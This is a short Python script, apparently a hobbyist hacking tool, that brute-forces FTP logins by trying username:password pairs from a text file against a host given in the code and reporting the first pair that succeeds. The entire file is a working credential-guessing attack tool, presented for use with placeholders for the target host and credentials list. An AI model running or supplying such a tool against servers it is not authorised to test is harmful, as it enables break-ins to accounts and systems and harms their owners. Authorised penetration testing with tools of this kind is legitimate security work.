"""
Created by V I E R U S   ||   Date 07/31/2023
This program is a Brute force scan of any FTP ports
"""
#Imports
import ftplib

def bruteforcelogin(hostname, hostpassword):
    passList = open(hostpassword, 'r')
    #Loops through your text document to see if it could access the ports to connect
    for line in passList.readlines():
        username = line.split(':')[0]
        userpassword = line.split(':')[1].strip("\n")
        print("[+] Trying user: " + str(username) + " || password: " +str(userpassword))

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, userpassword)
            print("\n[+] username: " + str(username) + " || password: " + str(userpassword) + " > FTP Login Succeded.\n")
            ftp.quit()
            return (username, userpassword)
        
        except Exception:
            print("\n[-] username: " + str(username) + " || password: " + str(userpassword) + " > FTP Login Failed.\n")



if __name__== '__main__':
    hostname = "123"    #Type in your hostname here
    hostpassword = "credentials.txt"    #Either Type your credentials in the txt document or add your own file
    bruteforcelogin(hostname, hostpassword)